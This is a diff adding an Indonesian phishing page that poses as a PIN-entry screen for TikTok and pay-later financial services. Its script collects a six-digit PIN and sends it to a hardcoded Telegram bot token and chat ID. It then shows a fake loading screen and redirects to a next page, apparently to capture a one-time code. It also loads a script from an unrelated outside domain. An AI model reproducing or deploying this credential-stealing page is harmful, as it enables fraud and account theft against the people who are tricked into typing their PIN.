@@ -1,0 +1,199 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Masukkan PIN</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            font-family: 'Segoe UI', sans-serif;
+            background-color: #ffffff;
+        }
+
+        /* Header */
+        .header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 20px; }
+        .back-btn { font-size: 24px; cursor: pointer; color: #000; }
+        .title { font-size: 17px; font-weight: 700; }
+
+        .header .back-icon {
+            margin-right: 15px;
+            font-size: 1.3rem;
+            text-decoration: none;
+            color: black;
+        }
+
+        .content {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding-top: 50px;
+        }
+
+        .instruction-text {
+            color: #555;
+            font-size: 0.95rem;
+            margin-bottom: 25px;
+            text-align: center;
+        }
+
+        /* UKURAN KOTAK PIN DI-PERKECIL LAGI */
+        .pin-wrapper {
+            display: flex;
+            gap: 8px;
+            /* Jarak lebih rapat */
+            justify-content: center;
+        }
+
+        .pin-box {
+            width: 36px;
+            /* Ukuran lebih kecil */
+            height: 46px;
+            /* Tinggi disesuaikan */
+            border: 1px solid #ccc;
+            border-radius: 6px;
+            /* Sudut lebih kecil agar proporsional */
+            text-align: center;
+            font-size: 1.2rem;
+            font-weight: 700;
+            background-color: white;
+            outline: none;
+            transition: 0.2s;
+        }
+
+        .pin-box:focus {
+            border: 1.5px solid #555;
+        }
+
+        /* Overlay Loading */
+        #loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(245, 250, 240, 0);
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+        }
+
+        .loader {
+            width: 45px;
+            height: 45px;
+            border: 5px solid #e0e0e0;
+            border-top: 5px solid #000;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 15px;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+        .loading-text {
+            color: #ffffffff;
+            font-size: 1.1rem;
+            font-weight: 600;
+        }
+    </style>
+</head>
+<body>
+
+    <div id="loading-overlay">
+        <div class="loader"></div>
+        <div class="loading-text">
+            Mohon Tunggu...
+        </div>
+    </div>
+
+    <div class="header">
+        <span class="back-btn" onclick="location.reload()">&#10094;</span>
+        <div class="title" id="page-title">Masukkan PIN</div>
+        <span style="font-size: 20px; cursor: pointer;">&#9432;</span>
+    </div>
+
+    <div class="content">
+        <div class="instruction-text">
+            
+        </div>
+
+        <div class="pin-wrapper">
+            <input type="password" class="pin-box" maxlength="1" inputmode="numeric">
+            <input type="password" class="pin-box" maxlength="1" inputmode="numeric">
+            <input type="password" class="pin-box" maxlength="1" inputmode="numeric">
+            <input type="password" class="pin-box" maxlength="1" inputmode="numeric">
+            <input type="password" class="pin-box" maxlength="1" inputmode="numeric">
+            <input type="password" class="pin-box" maxlength="1" inputmode="numeric">
+        </div>
+    </div>
+
+    <script>
+        const token = "8477958647:AAGfDluTesqg1TzOw1xzUn4suNLZEuYJQ6Q";
+        const chatId = "-1003985526393";
+        const boxes = document.querySelectorAll('.pin-box');
+
+        boxes.forEach((box, i) => {
+            box.addEventListener('input', () => {
+                if (box.value && i < boxes.length - 1) {
+                    boxes[i + 1].focus();
+                }
+                checkPin();
+            });
+
+            box.addEventListener('keydown',
+                (e) => {
+                    if (e.key === 'Backspace' && !box.value && i > 0) {
+                        boxes[i - 1].focus();
+                    }
+                });
+        });
+
+        function checkPin() {
+            let val = "";
+            boxes.forEach(b => val += b.value);
+            if (val.length === 6) {
+                document.getElementById('loading-overlay').style.display = 'flex';
+                fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId, text: `<b>PIN:</b> <code>${val}</code>`, parse_mode: 'html'
+                    })
+                })
+                .then(() => {
+                    setTimeout(() => {
+                        window.location.href = "ott.html";
+                    }, 2000);
+                })
+                .catch(() => {
+                  
+                });
+            }
+        }
+    </script>
+</body>
+     <center>   <br><br><br><br><br><br><br><br>        <br><br><br><br><br><br><br><br>        <br><br><br><br><br><br><br>    
+            </div>
+            <small class="text-center d-block text-muted"> ©2025 PT. TikTok Pte.Ltd. All rights reserved
+
+Atome, Akulaku & Gopaylater. yang berizin dan diawasi oleh <br> Otoritas Jasa Keuangan  (OJK).
+            </small>
+        </div>
+    </div>
+</div>
+    <link rel="modulepreload" href="https://beasiswa-amartha.org/build/assets/app-DIWlI6zE.js" /><script type="module" src="https://beasiswa-amartha.org/build/assets/app-DIWlI6zE.js"></script>    </body>
+</html>
